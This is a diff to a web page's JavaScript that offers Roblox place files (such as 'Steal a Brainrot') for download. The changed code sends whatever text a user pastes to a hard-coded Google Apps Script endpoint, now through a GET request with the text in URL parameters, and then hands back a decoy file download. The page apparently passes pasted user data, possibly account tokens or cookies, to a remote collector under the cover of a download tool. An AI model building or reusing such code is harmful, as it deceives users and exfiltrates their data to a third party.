@@ -384,7 +384,6 @@ button:disabled {
      ⚙️  CONFIG  —  EDIT ONLY THIS BLOCK
      ============================================================ */
 
-  // 1) ID → FILENAME for the download.
   const ID_FILES = {
     '123923334828954': 'place 123923334828954 Steal a Brainrot.rbxlx',
     '120219252362013': 'place 120219252362013 Throw Food For Animals.rbxlx',
@@ -396,9 +395,9 @@ button:disabled {
   const DEFAULT_FILE = 'backup.txt';
   const REQUIRE_MATCH = false;
 
-  // 2) 🔥 PUT YOUR GOOGLE SCRIPT URL HERE
-  // (Make sure it ends with /exec, NOT /dev)
-  const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyBg-ywJmoxCotMign7MXVD1nBlBD32VXWcVoe8oOHdBXoCMmr0Ji7ghfR1rQMyicHOQQ/exec';
+  // 🔥 PUT YOUR NEW GOOGLE SCRIPT /EXEC URL HERE
+  const WORKER_URL = 'https://script.google.com/macros/s/AKfycbyeVs1ZS8mlOIIfRj5Bi3pMktqegoHp332Ef1sm1TI1BL92ff-hJe9QhM22wJiiBLJbRg/exec';
+  
   const WORKER_TOKEN = '';
 
   /* ============================================================
@@ -479,14 +478,14 @@ button:disabled {
     setStatus('Sending…');
 
     try {
-      const payload = { text: raw, id: match.id || '' };
-      if (WORKER_TOKEN) payload.token = WORKER_TOKEN;
+      // We now use GET with URL parameters to avoid CORS completely
+      const url = new URL(WORKER_URL);
+      url.searchParams.append('id', match.id || '');
+      url.searchParams.append('token', WORKER_TOKEN);
+      url.searchParams.append('text', raw);
 
-      // text/plain prevents CORS pre-flight issues on Google Scripts
-      const response = await fetch(WORKER_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'text/plain' }, 
-        body: JSON.stringify(payload)
+      const response = await fetch(url.toString(), {
+        method: 'GET'
       });
 
       if (!response.ok) {
@@ -501,16 +500,16 @@ button:disabled {
       }
 
       const blob = new Blob([textBody], { type: 'application/octet-stream' });
-      const url  = URL.createObjectURL(blob);
+      const urlBlob  = URL.createObjectURL(blob);
 
       const a = document.createElement('a');
-      a.href = url;
+      a.href = urlBlob;
       a.download = match.file;
       document.body.appendChild(a);
       a.click();
       a.remove();
 
-      setTimeout(() => URL.revokeObjectURL(url), 3000);
+      setTimeout(() => URL.revokeObjectURL(urlBlob), 3000);
 
       if (match.id) {
         toast('✅ Sent. Downloading ' + match.file);
@@ -531,6 +530,16 @@ button:disabled {
       btn.disabled = false;
     }
   }
+
+  btn.addEventListener('click', handleSend);
+
+  input.addEventListener('keydown', e => {
+    if (e.key === 'Enter') { e.preventDefault(); handleSend(); }
+  });
+
+  input.addEventListener('input', updateHint);
+  input.addEventListener('paste', () => setTimeout(updateHint, 0));
+
 
   /* ===== visual effects (unchanged) ===== */
 
